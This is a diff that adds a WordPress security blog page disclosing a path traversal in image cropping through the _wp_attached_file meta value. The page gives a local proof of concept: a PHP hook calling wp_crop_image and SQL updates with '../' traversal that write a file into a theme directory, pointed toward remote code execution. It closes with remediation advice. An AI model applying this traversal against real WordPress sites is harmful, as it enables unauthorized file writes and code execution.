@@ -1,0 +1,89 @@
+<html lang="en-US"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>WordPress write image to any directory RCE | wpdeeply.com</title>
+<meta name="generator" content="Jekyll v3.8.7">
+<meta property="og:title" content="WordPress write image to any directory RCE">
+<meta property="og:locale" content="en_US">
+<link rel="canonical" href="https://wpdeeply.com/start/wp-http-file-paths.html">
+<meta property="og:url" content="https://wpdeeply.com/start/wp-http-file-paths.html">
+<meta property="og:site_name" content="wpdeeply.com">
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"WordPress write image to any directory RCE","url":"https://wpdeeply.com/start/wp-http-file-paths.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <style class="anchorjs"></style><link rel="stylesheet" href="/assets/css/style.css?v=518b2cf2849a56b39ffd4c676b59a8b6129c06ec">
+  </head>
+  <body>
+    <div class="container-lg px-3 my-5 markdown-body">
+      
+      
+      
+
+      <h1 id="wordpress-write-image-to-any-directory-rce">WordPress write image to any directory RCE</h1>
+
+<p>Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from <code class="language-plaintext highlighter-rouge">_wp_attached_file</code>. Those issues are subject for deeper observation and debugging which will happen in the very near future, for now we need to get another conclusion.</p>
+
+<h2 id="eli5-poc">Eli5 PoC<a class="anchorjs-link " href="#eli5-poc" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em/1 anchorjs-icons; padding-left: 0.375em;"></a></h2>
+<ul>
+  <li>Upload image to your local WP and name it wpdeeply.png (in order to be able to use copy paste from here in next steps)</li>
+  <li>Get attachment_id (post_id of the image)</li>
+  <li>Enable hello.php plugin and add this code at the end of the file
+```
+function wprcedemo(){
+&nbsp; &nbsp; 
+&nbsp; &nbsp; //add your attachment_id here - mine is 77
+&nbsp; &nbsp; $attachment_id = 77;
+&nbsp; &nbsp; 
+&nbsp; &nbsp; if ( ! function_exists( ‘wp_crop_image’ ) ) {
+&nbsp; &nbsp; &nbsp; &nbsp; include ABSPATH . ‘wp-admin/includes/image.php’;
+&nbsp; &nbsp; }</li>
+</ul>
+
+<p>&nbsp; &nbsp; wp_crop_image($attachment_id, 0, 0, 300, 300, 300, 300);
+&nbsp; &nbsp; 
+&nbsp; &nbsp; exit(“good :)”);
+}</p>
+
+<p>add_action(“init”, “wprcedemo”);</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Open mysql administration tool and execute following query
+</code></pre></div></div>
+<p>UPDATE <code class="language-plaintext highlighter-rouge">wp_postmeta</code> SET <code class="language-plaintext highlighter-rouge">meta_value</code> = &nbsp;concat(‘2020/07/wpdeeply.png#/’,’boom.png’ ) WHERE <code class="language-plaintext highlighter-rouge">wp_postmeta</code>.<code class="language-plaintext highlighter-rouge">meta_key</code> = ‘_wp_attached_file’ and <code class="language-plaintext highlighter-rouge">wp_postmeta</code>.<code class="language-plaintext highlighter-rouge">post_id</code> = 77</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Refresh the home page (good :) should be printed) and under `2020/07` there should be new directory `wpdeeply.png#`
+- Open mysql administration tool and execute following query
+</code></pre></div></div>
+<p>UPDATE <code class="language-plaintext highlighter-rouge">wp_postmeta</code> SET <code class="language-plaintext highlighter-rouge">meta_value</code> = concat(‘2020/07/wpdeeply.png#/../../../../themes/twentytwenty/boom.png’ ) WHERE <code class="language-plaintext highlighter-rouge">wp_postmeta</code>.<code class="language-plaintext highlighter-rouge">meta_key</code> = ‘_wp_attached_file’ and <code class="language-plaintext highlighter-rouge">wp_postmeta</code>.<code class="language-plaintext highlighter-rouge">post_id</code> = 77
+```</p>
+<ul>
+  <li>Refresh the home page (good :) should be printed) and under <code class="language-plaintext highlighter-rouge">twentytwenty</code> theme should be <code class="language-plaintext highlighter-rouge">cropped-boom.png</code> file</li>
+  <li><code class="language-plaintext highlighter-rouge">_wp_page_template</code> meta_value away from RCE</li>
+</ul>
+
+<h2 id="few-facts">Few facts<a class="anchorjs-link " href="#few-facts" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em/1 anchorjs-icons; padding-left: 0.375em;"></a></h2>
+<ul>
+  <li>WordPress allows files with valid image extension and any content in it (not complete security patches from the past)</li>
+  <li>This bug is also part of not complete security patch in the past</li>
+  <li><code class="language-plaintext highlighter-rouge">_wp_attached_file</code> value becomes holy grail of WordPress security and still there are ways to interfere with it (via core)</li>
+  <li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li>
+</ul>
+
+<h2 id="remediation">Remediation<a class="anchorjs-link " href="#remediation" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em/1 anchorjs-icons; padding-left: 0.375em;"></a></h2>
+<ul>
+  <li>Core files shouldn’t be writable by www-data user</li>
+  <li>Theme files shouldn’t be writable by www-data user too</li>
+  <li>Turn automatic updates for WP core, plugins, themes OFF</li>
+</ul>
+
+
+      
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
+    <script>anchors.add();</script>
+    
+  
+
+</body></html>
